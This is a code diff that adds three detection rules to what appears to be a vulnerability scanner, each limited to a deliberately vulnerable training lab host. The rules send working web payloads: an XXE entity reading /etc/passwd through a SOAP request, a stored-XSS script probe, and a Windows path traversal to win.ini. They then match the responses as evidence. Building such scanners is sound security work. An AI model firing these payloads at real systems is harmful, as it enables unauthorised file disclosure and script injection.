@@ -7251,6 +7251,81 @@ const burpbountyRedirectGotoLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyXxeSoapLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const soapUrl = new URL("/xxe/soap", ctx.origin).toString();
+  const payload =
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+  const doc = await ctx.probe.get(soapUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "text/xml" },
+    maxBytes: 8192
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const soapXxe =
+    /<soap:Envelope/i.test(doc.body) &&
+    /<GetUserResponse>/i.test(doc.body) &&
+    /root:x:0:0:/.test(doc.body) &&
+    /\/bin\/(?:bash|sh|false)/.test(doc.body);
+  if (!soapXxe) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: soapUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab POST /xxe/soap resolves external entities in SOAP body and returns /etc/passwd inside GetUserResponse — SOAP XXE profile oracle"
+    }
+  };
+};
+
+const burpbountyXssBlindLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const canary = `thugirBlind${Date.now().toString(36)}`;
+  const probeUrl = new URL("/xss/blind", ctx.origin);
+  probeUrl.searchParams.set("feedback", `<script>${canary}</script>`);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const storedXss =
+    /Feedback Received|Feedback Stored/i.test(doc.body) &&
+    new RegExp(`<script>${canary}</script>`, "i").test(doc.body) &&
+    /admin-review/i.test(doc.body);
+  if (!storedXss) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: probeUrl.toString(),
+      canary,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab GET /xss/blind?feedback= stores attacker script in admin-review panel without sanitization — blind/stored XSS profile oracle"
+    }
+  };
+};
+
+const burpbountyPtReadwinLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/pt/readwin", ctx.origin);
+  probeUrl.searchParams.set("file", "..\\..\\windows\\win.ini");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const winIni =
+    /\[fonts\]/i.test(doc.body) &&
+    /\[extensions\]/i.test(doc.body) &&
+    (/MAPI=1/i.test(doc.body) || /\[Mail\]/i.test(doc.body));
+  if (!winIni) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab GET /pt/readwin?file=..\\..\\windows\\win.ini returns win.ini contents — Windows path-traversal profile oracle distinct from /pt/read Unix traversal"
+    }
+  };
+};
+
 // --- BugBait vulnerable Node.js training app (bugbait.io) -----------------------------
 const CLIENT_BUGBAIT_RES: { label: string; re: RegExp }[] = [
   {
@@ -32146,6 +32221,9 @@ export const RULES: Record<string, Rule> = {
   burpbountySqliOobLiveOracle,
   burpbountySqliTimeLiveOracle,
   burpbountyRedirectGotoLiveOracle,
+  burpbountyXxeSoapLiveOracle,
+  burpbountyXssBlindLiveOracle,
+  burpbountyPtReadwinLiveOracle,
   clientSideBugbaitEvidence,
   clientSideArtemisKitEvidence,
   clientSideRailsgoatEvidence,
